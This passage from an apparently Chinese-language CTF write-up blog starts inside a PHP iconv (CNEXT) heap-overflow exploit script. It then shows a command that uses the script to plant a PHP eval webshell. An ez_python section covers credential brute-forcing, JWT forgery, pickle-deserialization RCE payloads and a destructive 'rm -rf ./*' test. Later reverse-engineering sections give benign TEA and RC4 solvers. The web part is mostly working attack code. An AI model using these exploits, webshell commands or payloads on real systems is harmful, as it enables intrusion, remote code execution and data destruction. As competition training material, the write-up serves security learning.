resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        filters = [</span><br><span class="line">            <span class="comment"># Create buckets</span></span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 0: Setup heap</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 1: Reverse FL order</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 2: Put fake pointer and make FL order back to normal</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 3: Trigger overflow</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span></span><br><span class="line">            <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line">        filters = <span class="string">&quot;|&quot;</span>.join(filters)</span><br><span class="line">        path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="meta">    @inform(<span class="params"><span class="string">&quot;Triggering...&quot;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        path = self.build_exploit_path()</span><br><span class="line">        start = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.remote.send(path)</span><br><span class="line">        <span class="keyword">except</span> (ConnectionError, ChunkedEncodingError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        msg_print()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.sleep:</span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> start + self.sleep &lt;= time.time():</span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span></span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Remove 2-byte header and 4-byte checksum</span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    payload = base64.encode(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload.encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size</span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))</span><br><span class="line">    bucket = qpe(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = compressed_bucket(bucket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span></span><br><span class="line"><span class="string">    chunked representation has size `size`.</span></span><br><span class="line"><span class="string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span></span><br><span class="line">    <span class="comment"># enough</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span></span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    start: <span class="built_in">int</span></span><br><span class="line">    stop: <span class="built_in">int</span></span><br><span class="line">    permissions: <span class="built_in">str</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py http://<span class="number">192.168</span><span class="number">.18</span><span class="number">.24</span>/ <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[0]);?&gt;&#x27;&gt;/var/www/html/1.php;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205406473-2044450703.png" alt="img"></p><h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>扫了发现只有个login路由,交叉爆破一下用户名密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png" alt="img"></p><p>爆出用户名密码是test/123456返回给了个token,是jwt,存在密钥,爆破一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png" alt="img"></p><p>得到key是a123456,然后jwt伪造</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205444958-1050385586.png" alt="img"></p><p>更改jwt后点access后有一个弹窗，说ser有点好东西</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205502169-1811646368.png" alt="img"></p><p>访问后能得到部分源码:</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205513354-1792537572.png" alt="img"></p><p>分析源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hhhhackme</span>(<span class="params">pickled</span>):</span><br><span class="line">    data = base64.urlsafe_b64decode(pickled)</span><br><span class="line">    deserialized = pickle.loads(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>,<span class="number">204</span>;</span><br></pre></td></tr></table></figure><p>发现能打python反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd=<span class="string">&#x27;&#x27;&#x27;import os;os.system(&#x27;ls&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (cmd,))</span><br><span class="line"></span><br><span class="line">malicious_data = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line">encoded_malicious_data = base64.urlsafe_b64encode(malicious_data).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encoded malicious payload:&quot;</span>, encoded_malicious_data)</span><br></pre></td></tr></table></figure><p>将上面结果发过去后并多次测试后发现无回显不出网</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205601347-1546485428.png" alt="img"></p><p>因为无回显不出网，无法判断命令能否正常执行，所以尝试了一些破坏性的命令如<code>rm -rf ./*</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205613652-933257913.png" alt="img"></p><p>判断出文件路径<code>/app/ser.py</code></p><p>可以将命令结果直接写到这个文件并且读取了，因为写文件会影响<code>ser.py</code>文件的正常运行，所以在前面加<code>#</code>后面拼接命令，但是要注意的是输出的结果不要太多行，因为读取源码的时候发现会在每行后面加<code>\n</code>，输出多行的话只会在第一行前面加<code>#</code>，还是需要重启环境</p><p>最后猜测flag位置在<code>/flag</code>，直接<code>cat /flag</code>将结果输入到<code>ser.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd=<span class="string">&#x27;&#x27;&#x27;import os;os.system(&#x27;echo &quot;#&quot;+&quot;`cat /flag`&quot; &gt;&gt; /app/ser.py&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (cmd,))</span><br><span class="line"></span><br><span class="line">malicious_data = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line">encoded_malicious_data = base64.urlsafe_b64encode(malicious_data).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encoded malicious payload:&quot;</span>, encoded_malicious_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：Encoded malicious payload: gASVWAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw8aW1wb3J0IG9zO29zLnN5c3RlbSgnZWNobyAiIyIrImBjYXQgL2ZsYWdgIiA-PiAvYXBwL3Nlci5weScplIWUUpQu</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205654359-4809249.png" alt="img"></p><p>再次访问ser得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205703837-1572091863.png" alt="img"></p><p>flag: 37ea8bacf16f4c1899ba23560c0b3ed1</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="joyVBS"><a href="#joyVBS" class="headerlink" title="joyVBS"></a>joyVBS</h2><p>​    经典的VBS混淆，强网刚遇到过，给dim定义之后输出以下代码逻辑，一开始用WScript.Echo复制不了数据人麻了，ocr卡半天，后面加了两行代码给dump到本地才行</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">file</span> = fso.CreateTextFile(<span class="string">&quot;111.txt&quot;</span>, <span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">file</span>.WriteLine(output)</span><br><span class="line"><span class="keyword">file</span>.Close</span><br></pre></td></tr></table></figure><p>发现就是解一个凯撒加base64,凯撒的偏移是12</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/vZoWSoai2VpZq5eB.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/5xhOndXOdLLkNd4M.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/zSOBc0GiPRVBaGPD.png!thumbnail" alt="img"></p><h2 id="Rafflesia"><a href="#Rafflesia" class="headerlink" title="Rafflesia"></a>Rafflesia</h2><p>花指令，jzjnz直接nop，然后直接动态跟逻辑，干掉反调继续往下走</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Sm60hiT4Q2tDxOTz.png!thumbnail" alt="img"></p><p>然后跟到回调之后有码表的更换</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/ItJH9zPZWTbYzP7t.png!thumbnail" alt="img"></p><p>直接跑起来弄出码表，然后发现主逻辑中藏了一个异或24的逻辑</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/2B0uj3goqtqlJTgv.png!thumbnail" alt="img"></p><p>密文异或完24直接解变表base64即可</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/GhYJvDIApuRcmE5v.png!thumbnail" alt="img"></p><h2 id="RE5"><a href="#RE5" class="headerlink" title="RE5"></a>RE5</h2><p>面上的就是经典tea，不过肯定没这么简单，调起来之后主要就是</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/KrfmuTQsKbCFoif6.png!thumbnail" alt="img">动调之后触发了两段除零异常</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Lsnpv8VSic2hiDDZ.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/qeaAheFM9BV9FaY0.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/gWB8DWImRToEGCR1.png!thumbnail" alt="img"></p><p>给密钥换了，然后是加密的逻辑过程中也有异常被触发，走的都是上述相同的异常逻辑，直接提取密文模拟一下随机数获取的逻辑即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* data, <span class="type">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> block1 = data[<span class="number">0</span>], block2 = data[<span class="number">1</span>], round_sum, idx;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> round_sums[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">32</span>; idx++) &#123;</span><br><span class="line">        round_sums[idx] = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="keyword">if</span> (idx != <span class="number">0</span>)</span><br><span class="line">            round_sums[idx] += round_sums[idx - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key_part1 = key[<span class="number">0</span>], key_part2 = key[<span class="number">1</span>], key_part3 = key[<span class="number">2</span>], key_part4 = key[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">32</span>; idx++) &#123;</span><br><span class="line">        round_sum = round_sums[<span class="number">31</span> - idx];</span><br><span class="line">        block2 -= ((block1 &lt;&lt; <span class="number">4</span>) + key_part3) ^ (block1 + round_sum) ^ ((block1 &gt;&gt; <span class="number">5</span>) + key_part4);</span><br><span class="line">        block1 -= ((block2 &lt;&lt; <span class="number">4</span>) + key_part1) ^ (block2 + round_sum) ^ ((block2 &gt;&gt; <span class="number">5</span>) + key_part2);</span><br><span class="line">    &#125;</span><br><span class="line">    data[<span class="number">0</span>] = block1; data[<span class="number">1</span>] = block2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">uint32_t</span> data[] = &#123;<span class="number">0xEA2063F8</span>, <span class="number">0x8F66F252</span>, <span class="number">0x902A72EF</span>, <span class="number">0x411FDA74</span>, <span class="number">0x19590D4D</span>, <span class="number">0xCAE74317</span>, <span class="number">0x63870F3F</span>, <span class="number">0xD753AE61</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(data, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">2</span>, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">4</span>, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">6</span>, key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, data);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>下下来之后用pycharm打开，按照他给的base解密</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"><span class="built_in">exp</span> = (每次解密后的得出解密代码)<span class="comment">#把前面的”exec(“和后面”)“删掉</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解码后的数据写入到一个文本文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decoded_output28.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">     f.<span class="built_in">write</span>(<span class="built_in">exp</span>)</span><br><span class="line">        </span><br><span class="line">print(<span class="string">&quot;解密结果已经写入到 decoded_output28.txt 文件中。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一共这样循环28次的base64/32/85</p><p> 最后解出来是个rc4加密：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=<span class="literal">True</span></span><br><span class="line"><span class="attribute">d</span>=len</span><br><span class="line"><span class="attribute">G</span>=list</span><br><span class="line"><span class="attribute">g</span>=range</span><br><span class="line"><span class="attribute">s</span>=next</span><br><span class="line"><span class="attribute">R</span>=bytes</span><br><span class="line"><span class="attribute">o</span>=input</span><br><span class="line"><span class="attribute">Y</span>=print</span><br><span class="line"></span><br><span class="line">def l(S):</span><br><span class="line">    <span class="attribute">i</span>=0</span><br><span class="line">    <span class="attribute">j</span>=0</span><br><span class="line">    <span class="keyword">while</span> a:</span><br><span class="line">        i=(i+1)%256</span><br><span class="line">        j=(j+S[i])%256</span><br><span class="line">        S[i],S[j]=S[j],S[i]</span><br><span class="line">        <span class="attribute">K</span>=S[(S[i]+S[j])%256]</span><br><span class="line">    yield K</span><br><span class="line"></span><br><span class="line">def N(key,O):</span><br><span class="line">     <span class="attribute">I</span>=d(key)</span><br><span class="line">     <span class="attribute">S</span>=G(g(256))</span><br><span class="line">     <span class="attribute">j</span>=0</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> g(256):</span><br><span class="line">        j=(j+S[i]+key[i%I])%256</span><br><span class="line">        S[i],S[j]=S[j],S[i]</span><br><span class="line">        <span class="attribute">z</span>=l(S)</span><br><span class="line">        n=[]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">          n.append(k^s(z)+2)</span><br><span class="line">        return R(n)</span><br><span class="line"></span><br><span class="line">def E(s,parts_num):</span><br><span class="line">     <span class="attribute">Q</span>=d(s.decode())</span><br><span class="line">     <span class="attribute">S</span>=Q//parts_num</span><br><span class="line">     <span class="attribute">u</span>=Q%parts_num</span><br><span class="line">     W=[]</span><br><span class="line">     <span class="attribute">j</span>=0</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">        <span class="attribute">T</span>=j+S</span><br><span class="line">        <span class="keyword">if</span> u&gt;0:</span><br><span class="line">            T+=1</span><br><span class="line">            <span class="attribute">u-</span>=1</span><br><span class="line">        W.append(s[j:T])</span><br><span class="line">        <span class="attribute">j</span>=T</span><br><span class="line">        return W</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attribute">__name__</span>==&#x27;__main__&#x27;:</span><br><span class="line"> <span class="attribute">L</span>=o(&#x27;input the flag: &gt;&gt;&gt; <span class="string">&#x27;).encode()</span></span><br><span class="line"><span class="string"> assert d(L)%2==0,&#x27;</span>flag length should be even<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> t=b&#x27;</span>v3ry_s3cr3t_p@ssw0rd<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> O=E(L,2)</span></span><br><span class="line"><span class="string"> U=[]</span></span><br><span class="line"><span class="string"> for i in O:</span></span><br><span class="line"><span class="string">     U.append(N(t,i).hex())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if U==[&#x27;</span>1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60<span class="string">&#x27;,&#x27;</span>2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a<span class="string">&#x27;]:</span></span><br><span class="line"><span class="string">    Y(&#x27;</span>Congratulations! You got the flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    print(&#x27;</span>Wrong flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>所以exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 